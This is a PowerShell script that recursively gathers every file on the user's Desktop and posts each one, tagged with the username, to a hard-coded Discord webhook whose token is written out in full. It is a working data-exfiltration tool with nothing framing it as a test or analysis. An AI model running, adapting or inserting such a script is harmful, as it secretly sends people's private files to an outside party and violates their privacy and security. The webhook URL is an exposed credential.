# Load the required assembly for HTTP operations
Add-Type -AssemblyName System.Net.Http

# Define the webhook URL
$webhookUrl = "https://discordapp.com/api/webhooks/1287930563402924112/7i_MKNW3xnJc-hWpfS8dLSILaSS-2Cs6Vf0SOT9KQyA2pWcwXrcAnL3IiVP8tnhDCqQ6"

# Define the Desktop path
$desktopPath = "$env:USERPROFILE\Desktop"

# Get all files on the Desktop, including those in subdirectories
$files = Get-ChildItem -Path $desktopPath -File -Recurse

if ($files.Count -eq 0) {
    Write-Host "No files found on the Desktop. Exiting script."
    exit
}

try {
    # Create a single HTTP client instance to reuse for all requests.
    $httpClient = New-Object System.Net.Http.HttpClient

    foreach ($file in $files) {
        Write-Host "Sending file: $($file.Name)"
        
        # Create a new multipart form content for this file
        $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
        
        # Optionally, add a text message with the file name
        $messageText = "File from: $env:USERNAME and File name: $($file.Name)"
        $messageContent = New-Object System.Net.Http.StringContent($messageText)
        $messageContent.Headers.Add("Content-Disposition", "form-data; name=`"content`"")
        $multipartContent.Add($messageContent)
        
        try {
            # Open the file stream and add the file as content
            $fileStream = [System.IO.File]::OpenRead($file.FullName)
            $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
            $fileContent.Headers.Add("Content-Disposition", "form-data; name=`"file`"; filename=`"$($file.Name)`"")
            $multipartContent.Add($fileContent, "file", $file.Name)
        } catch {
            Write-Host "Error attaching file '$($file.FullName)': $_"
            continue
        }
        
        # Send the POST request for this file
        try {
            $response = $httpClient.PostAsync($webhookUrl, $multipartContent).Result
            Write-Host "Response for $($file.Name) - Status Code: $($response.StatusCode)"
            $responseContent = $response.Content.ReadAsStringAsync().Result
            Write-Host "Response Content: $responseContent"
        } catch {
            Write-Host "Error sending file '$($file.Name)': $_"
        }
    }
} catch {
    Write-Host "An error occurred during the operation: $_"
}
